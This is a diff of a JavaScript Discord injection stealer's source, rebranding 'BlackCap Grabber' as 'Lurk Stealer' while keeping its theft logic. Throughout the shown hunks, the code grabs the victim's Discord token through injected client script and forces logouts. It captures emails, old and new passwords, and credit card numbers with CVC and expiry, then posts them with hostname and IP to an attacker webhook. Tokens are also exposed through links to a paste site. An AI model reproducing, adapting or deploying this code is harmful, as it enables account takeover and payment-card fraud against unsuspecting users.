@@ -25,7 +25,7 @@ const config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 374276,
+    "embed-color": 0x2F3136,
 
     injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "%WEBHOOK%",
@@ -126,7 +126,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }, 5000);
     }
-    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
+    if (!fs.existsSync(path.join(__dirname, "lurk"))) return !0;
     execScript(
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
@@ -261,29 +261,29 @@ async function FirstTime() {
     window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
 
         if (config['init-notify'] == "true") {
-            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+            if (fs.existsSync(path.join(__dirname, "lurk"))) {
+                fs.rmdirSync(path.join(__dirname, "lurk"));
                 if (token == null || token == undefined || token == "") {
                     var {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "BlackCap Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        username: "Lurk Stealer",
+                        avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
+                            title: "Discord Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                value: `\`\`\`diff\n- Hostname: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\``,
                                 inline: !1
 							}],
                             author: {
-                                name: "BlackCap"
+                                name: "Lurk Stealer"
                             },
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "Lurk Stealer"
                             }
 						}]
                     };
@@ -299,59 +299,55 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                        usericonurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                        bannerurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "BlackCap Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        username: "Lurk Stealer",
+                        avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            title: "Lurk Initalized",
+                            description: "",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\`)`,
                                 inline: !1
 								}, {
-                                name: "Username <:username:1041634536733290596> ",
+                                name: "Username",
                                 value: `\`${b.username}#${b.discriminator}\``,
                                 inline: !0
 								}, {
-                                name: "ID <:iduser:1041634535395307520>",
+                                name: "ID",
                                 value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                 inline: !0
 								}, {
-                                name: "Badges <:badge:1041634538150973460>",
+                                name: "Badges",
                                 value: `${GetBadges(b.flags)}`,
                                 inline: !0
 								}, {
-                                name: "Language <:language:1041640473477001236>",
+                                name: "Language",
                                 value: `${GetLangue(b.locale)}`,
                                 inline: !0
 								}, {
-                                name: "NSFW <a:nsfw:1041640474617839616>",
+                                name: "NSFW",
                                 value: `${GetNSFW(b.nsfw_allowed)}`,
                                 inline: !1
 								}, {
-                                name: "A2F <a:a2f:1040272766982692885>",
+                                name: "2FA",
                                 value: `${GetA2F(b.mfa_enabled)}`,
                                 inline: !0
 								}, {
-                                name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                inline: !0
-								}, {
-                                name: "<a:tokens:1041634540537511957> Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                name: "Token",
+                                value: `\`\`\`${token}\`\`\`**[Copy Token]**(https://paste-pgpj.onrender.com/?p=${token})\n\n**[Download Banner User]**(${bannerurl})`,
                                 inline: !1
 								}],
 
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "Lurk Stealer"
                             },
                             image: {
                                 url: bannerurl,
@@ -371,11 +367,11 @@ async function FirstTime() {
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
+                if (!fs.existsSync(path.join(__dirname, "lurk"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+                fs.rmdirSync(path.join(__dirname, "lurk"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -383,11 +379,11 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "BlackCap Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                username: "Lurk Stealer",
+                                avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCaped User log out (User not Logged in before)",
+                                    title: "User log out (User not Logged in before)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -395,10 +391,10 @@ async function FirstTime() {
                                         inline: !1
 							}],
                                     author: {
-                                        name: "BlackCap"
+                                        name: "Lurk Stealer"
                                     },
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "Lurk Stealer"
                                     }
 						}]
                             };
@@ -414,55 +410,51 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             if(b.avatar === null){
-                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                                usericonurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
-                                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                                bannerurl = ""
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "BlackCap Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                username: "Lurk Stealer",
+                                avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    title: "Victim got logged out",
+                                    description: "",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
-                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\`)`,
                                         inline: !1
 								}, {
-                                        name: "Username <:username:1041634536733290596> ",
+                                        name: "Username",
                                         value: `\`${b.username}#${b.discriminator}\``,
                                         inline: !0
 								}, {
-                                        name: "ID <:iduser:1041634535395307520>",
+                                        name: "ID",
                                         value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                         inline: !0
 								}, {
-                                        name: "Badges <:badge:1041634538150973460>",
+                                        name: "Badges",
                                         value: `${GetBadges(b.flags)}`,
                                         inline: !0
 								}, {
-                                        name: "NSFW <a:nsfw:1041640474617839616>",
+                                        name: "NSFW",
                                         value: `${GetNSFW(b.nsfw_allowed)}`,
                                         inline: !1
 								}, {
-                                        name: "A2F <a:a2f:1040272766982692885>",
+                                        name: "2FA",
                                         value: `${GetA2F(b.mfa_enabled)}`,
                                         inline: !0
 								}, {
-                                        name: "@Copyright",
-                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                        inline: !0
-								}, {
-                                        name: "<a:tokens:1041634540537511957> Token",
-                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                        name: "Token",
+                                        value: `\`\`\`${token}\`\`\`**[Copy Token]**(https://paste-pgpj.onrender.com/?p=${token})\n\n**[Download Banner]**(${bannerurl})`,
                                         inline: !1
 								}],
 
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "Lurk Stealer"
                                     },
                                     image: {
                                         url: bannerurl,
@@ -526,10 +518,10 @@ function GetNSFW(reader) {
 
 function GetA2F(reader) {
     if (reader == true) {
-        return ":lock: `A2F Enabled`"
+        return ":lock: `2FA Enabled`"
     }
     if (reader == false) {
-        return ":unlock: `A2F Not Enabled`"
+        return ":unlock: `2FA Not Enabled`"
     } else {
         return "Idk bro you got me"
     }
@@ -834,87 +826,83 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "Lurk Stealer",
+                avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap User Login",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "User Login",
+                    description: "",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\``,
                         inline: !1
 												}, {
-                        name: "Username <:username:1041634536733290596> ",
+                        name: "Username",
                         value: `\`${info.username}#${info.discriminator}\``,
                         inline: !0
 												}, {
-                        name: "ID <:iduser:1041634535395307520>",
+                        name: "ID",
                         value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                         inline: !0
 												}, {
-                        name: "Nitro <a:nitro:1041639670288748634>",
+                        name: "Nitro",
                         value: `${GetNitro(info.premium_type)}`,
                         inline: !0
 												}, {
-                        name: "Badges <:badge:1041634538150973460>",
+                        name: "Badges",
                         value: `${GetBadges(info.flags)}`,
                         inline: !0
 												}, {
-                        name: "Language <:language:1041640473477001236>",
+                        name: "Language",
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1041640474617839616>",
+                        name: "NSFW",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
-                        name: "A2F <a:a2f:1040272766982692885>",
+                        name: "2FA",
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
-                        name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                        inline: !0
-												}, {
-                        name: "Billing <a:billing:1041641103629234196>",
+                        name: "Billing",
                         value: `${Cool()}`,
                         inline: !1
 												}, {
-                        name: "Email <a:email:1041639672037785691>",
+                        name: "Email",
                         value: `\`${email}\``,
                         inline: !0
 												}, {
-                        name: "<a:password:1041639669047238676> Password",
+                        name: "Password",
                         value: `\`${password}\``,
                         inline: !0
 												}, {
-                        name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                        name: "Token",
+                        value: `\`\`\`${token}\`\`\`[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n**[Download Banner]**(${bannerurl})`,
                         inline: !1
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                    "title": `Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1002,84 +990,80 @@ async function ChangePassword(oldpassword, newpassword, token) {
             }
             let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "Lurk Stealer",
+                avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "Detect Password Changed",
+                    description: "",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
-                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\``,
                         inline: !1
 												}, {
-                        name: "Username <:username:1041634536733290596> ",
+                        name: "Username",
                         value: `\`${info.username}#${info.discriminator}\``,
                         inline: !0
 												}, {
-                        name: "ID <:iduser:1041634535395307520>",
+                        name: "ID",
                         value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                         inline: !0
 												}, {
-                        name: "Nitro <a:nitro:1041639670288748634>",
+                        name: "Nitro",
                         value: `${GetNitro(info.premium_type)}`,
                         inline: !0
 												}, {
-                        name: "Badges <:badge:1041634538150973460>",
+                        name: "Badges",
                         value: `${GetBadges(info.flags)}`,
                         inline: !0
 												}, {
-                        name: "Language <:language:1041640473477001236>",
+                        name: "Language",
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1041640474617839616>",
+                        name: "NSFW",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
-                        name: "A2F <a:a2f:1040272766982692885>",
+                        name: "2FA",
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
-                        name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                        inline: !0
-												}, {
-                        name: "Billing <a:billing:1041641103629234196>",
+                        name: "Billing",
                         value: `${Cool()}`,
                         inline: !1
 												}, {
-                        name: "Email <a:email:1041639672037785691>",
+                        name: "Email",
                         value: `\`${info.email}\``,
                         inline: !1
 												}, {
-                        name: "<a:password:1041639669047238676> Old Password",
+                        name: "Old Password",
                         value: `\`${oldpassword}\``,
                         inline: !0
 												}, {
-                        name: "<a:password:1041639669047238676> New Password",
+                        name: "New Password",
                         value: `\`${newpassword}\``,
                         inline: !0
 												}, {
-                        name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                        name: "Token",
+                        value: `\`\`\`${token}\`\`\`**[Copy Token]**(https://paste-pgpj.onrender.com/?p=${token})\n\n**[Download Banner]**(${bannerurl})`,
                         inline: !1
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                    "title": `Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1162,90 +1146,86 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
            const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "Lurk Stealer",
+                avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
                 content: "",
                 embeds: [{
-                        "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        "title": "Detect Email Changed",
+                        description: "",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n- Injection Path: \n${__dirname}\n- IP: \n${ip}\n\`\`\``,
                                 inline: !1
 					}, {
-                                name: "Username <:username:1041634536733290596>",
+                                name: "Username",
                                 value: `\`${info.username}#${info.discriminator}\``,
                                 inline: !0
 					}, {
-                                name: "ID <:iduser:1041634535395307520>",
+                                name: "ID",
                                 value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                                 inline: !0
 					}, {
-                                name: "Nitro <a:nitro:1041639670288748634>",
+                                name: "Nitro",
                                 value: `${GetNitro(info.premium_type)}`,
                                 inline: !0
 					}, {
-                                name: "Badges <:badge:1041634538150973460>",
+                                name: "Badges",
                                 value: `${GetBadges(info.flags)}`,
                                 inline: !0
 					}, {
-                                name: "Language <:language:1041640473477001236>",
+                                name: "Language",
                                 value: `${GetLangue(info.locale)}`,
                                 inline: !0
 					}, {
-                                name: "NSFW <a:nsfw:1041640474617839616>",
+                                name: "NSFW",
                                 value: `${GetNSFW(info.nsfw_allowed)}`,
                                 inline: !1
 					}, {
-                                name: "A2F <a:a2f:1040272766982692885>",
+                                name: "2FA",
                                 value: `${GetA2F(info.mfa_enabled)}`,
                                 inline: !0
 					}, {
-                                name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                inline: !0
-					}, {
-                                name: "Billing <a:billing:1041641103629234196>",
+                                name: "Billing>",
                                 value: `${Cool()}`,
                                 inline: !1
 					}, {
-                                name: "New Email <a:email:1041639672037785691>",
+                                name: "New Email",
                                 value: `\`${newemail}\``,
                                 inline: !0
 					}, {
-                                name: "<a:password:1041639669047238676> Password",
+                                name: "Password",
                                 value: `\`${password}\``,
                                 inline: !0
 					}, {
-                                name: "<a:tokens:1041634540537511957> Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                                name: "Token",
+                                value: `\`\`\`${token}\`\`\`\n**[Copy Token]**(https://paste-pgpj.onrender.com/?p=${token})\n\n**[Download Banner]**(${bannerurl})`,
                                 inline: !1
 					},
 				],
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "Lurk Stealer"
                         },
                         "thumbnail": {
                             "url": `${usericonurl}`
                         }
 				}, {
-                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
+                        "title": `Total Friends (${totalFriends()})`,
                         "color": config['embed-color'],
                         "description": CalcFriends(),
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "Lurk Stealer"
                         },
                         "image": {
                             'url': `${bannerurl}`,
@@ -1274,50 +1254,50 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
         if(info.avatar === null){
-            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            usericonurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            bannerurl = "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
-            username: "BlackCap Grabber",
-            avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+            username: "Lurk Stealer",
+            avatar_url: "https://media.discordapp.net/attachments/1065440731495399425/1066534729366655066/lurk.png",
             content: "",
             embeds: [{
-                    "title": "BlackCap User Credit Card Added",
+                    "title": "User Credit Card Added",
                     "description": `
                     **IP:** ${ip}\n\n
-                    **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
-                    **ID** <:iduser:1041634535395307520>\n\`\`\`${info.id}\`\`\`\n
-                    **Email** <a:email:1041639672037785691>\n\`\`\`${info.email}\`\`\`\n
-                    **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(info.premium_type)}\n
-					**Language** <:language:1041640473477001236>\n${GetLangue(info.locale)}\n
-					**A2F** <a:a2f:1040272766982692885>\n${GetA2F(info.mfa_enabled)}\n
-					**NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(info.nsfw_allowed)}\n
-                    **Badges** <:badge:1041634538150973460>\n${GetBadges(info.flags)}\n
+                    **Username** \n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
+                    **ID** \n\`\`\`${info.id}\`\`\`\n
+                    **Email** \n\`\`\`${info.email}\`\`\`\n
+                    **Nitro Type** \n${GetNitro(info.premium_type)}\n
+					**Language** \n${GetLangue(info.locale)}\n
+					**2FA** \n${GetA2F(info.mfa_enabled)}\n
+					**NSFW** \n${GetNSFW(info.nsfw_allowed)}\n
+                    **Badges** \n${GetBadges(info.flags)}\n
                     **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                     **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
-                    <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
+                    **Token** \n\`\`\`${token}\`\`\``,
                     "author": {
-                        "name": "BlackCap"
+                        "name": "Lurk Stealer"
                     },
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                     },
             },
                 {
-                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
+                    "title": `Guilds Owner`,
                     "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+                    "description": `\`\`\`diff\n${fs.readFileSync('lurkstealer_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Lurk Stealer"
                     },
                     "image": {
                         'url': `${bannerurl}`,
